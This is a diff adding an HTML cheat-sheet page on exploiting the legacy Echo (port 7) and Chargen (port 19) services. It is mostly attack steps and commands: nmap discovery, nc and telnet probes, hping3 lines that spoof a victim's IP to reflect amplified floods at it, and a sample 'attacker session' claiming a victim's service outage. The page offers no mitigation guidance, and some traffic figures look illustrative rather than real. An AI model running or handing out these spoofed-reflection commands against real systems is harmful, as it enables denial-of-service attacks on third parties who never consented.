@@ -1,0 +1,170 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Echo & Chargen Protocol Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network Security</strong> • Focus: <strong>Legacy Diagnostic Protocol Abuse</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Echo (port 7) and Chargen (port 19) are old diagnostic services. 
+    Echo returns any input sent, while Chargen floods output with random characters. 
+    Though obsolete, if exposed they can be exploited for reconnaissance or abused 
+    in reflection/amplification DDoS attacks. Attackers craft spoofed requests, causing 
+    these services to flood victims with traffic, or use them interactively to disrupt 
+    target systems. Their simplicity makes them dangerous when left enabled.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Anyone can interact with these services.</li>
+    <li><strong>Amplification Potential:</strong> Small requests → large responses (DDoS vector).</li>
+    <li><strong>UDP Reflection:</strong> Easy to spoof source IPs to direct traffic at victims.</li>
+    <li><strong>Legacy Exposure:</strong> Still enabled in some misconfigured devices or printers.</li>
+    <li><strong>Lack of Monitoring:</strong> Unused ports are rarely logged or monitored.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Scan for hosts with TCP/UDP 7 or 19 open.</li>
+    <li><strong>Interaction:</strong> Send input to Echo, receive same string back; to Chargen, trigger data flood.</li>
+    <li><strong>DDoS Amplification:</strong> Spoof victim IP in requests → server floods victim with responses.</li>
+    <li><strong>Impact:</strong> Service disruption, bandwidth exhaustion, or reconnaissance via reflection.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for Echo/Chargen services on target network.</li>
+    <li>Verify interaction (Echo → repeat input, Chargen → random output).</li>
+    <li>Craft spoofed packets for reflection/amplification against victim.</li>
+    <li>Leverage multiple exposed servers for large-scale DDoS.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p 7,19 -sU -sT [target]              # Scan for Echo/Chargen (UDP/TCP)
+nmap -sU --script=chargen [target]         # NSE script for Chargen detection
+
+# ------------------------------
+# Echo Interaction
+# ------------------------------
+nc -u [target] 7                           # Send UDP data to Echo
+echo "HELLO" | nc [target] 7               # TCP test (response should be HELLO)
+
+# ------------------------------
+# Chargen Interaction
+# ------------------------------
+nc -u [target] 19                          # Connect to Chargen UDP (flood of chars)
+telnet [target] 19                         # TCP Chargen output
+
+# ------------------------------
+# Reflection/Amplification (Spoofed packets)
+# ------------------------------
+hping3 -2 -s 1337 -a [victim_IP] -p 7 [target]   # Echo reflection to victim
+hping3 -2 -s 1337 -a [victim_IP] -p 19 [target]  # Chargen reflection to victim
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p 7,19 -sU 192.168.1.0/24
+echo "TEST" | nc 192.168.1.50 7                 # Echo responds "TEST"
+telnet 192.168.1.50 19                          # Chargen floods random data
+hping3 -2 -a 10.0.0.5 -p 19 192.168.1.50        # Amplification attack against victim 10.0.0.5
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p 7,19 -sU 192.168.1.50
+PORT   STATE SERVICE
+7/udp  open  echo
+19/udp open  chargen
+
+[ saide ~ ]$ echo "PINGTEST" | nc 192.168.1.50 7
+PINGTEST   <-- Echoed back from server
+
+[ saide ~ ]$ telnet 192.168.1.50 19
+Connected to 192.168.1.50
+Output:
+!@#$%^&*()_+1234567890abcdefghijklmnopqrstuvwxyz....
+
+[ saide ~ ]$ hping3 -2 -a 10.0.0.99 -p 19 192.168.1.50
+[*] Spoofed UDP packets sent
+[*] Victim 10.0.0.99 now receiving amplified floods from 192.168.1.50
+
+[ saide ~ ]$ tcpdump -i eth0 host 10.0.0.99
+12:33:45 Victim received 200k packets/sec from Echo/Chargen service
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Echo/Chargen exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Echo Test
+Sent:  "HELLO123"
+Recv:  "HELLO123"
+
+# Chargen Output
+!@#$%^&*()abcdefghijklmNOPQRSTUVWXYZ0123456789...
+(repeated flood until closed)
+
+# Reflection DDoS
+Spoofed requests: 100 packets
+Amplified victim traffic: 50,000 packets
+Victim overwhelmed — service outage confirmed
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/7-echo" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Echo
+      </a>
+    </li>
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/19-chargen" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Chargen
+      </a>
+    </li>
+    <li>Legacy DoS vectors: Echo-Chargen loop attacks and reflection DDoS.</li>
+  </ul>
+</section>
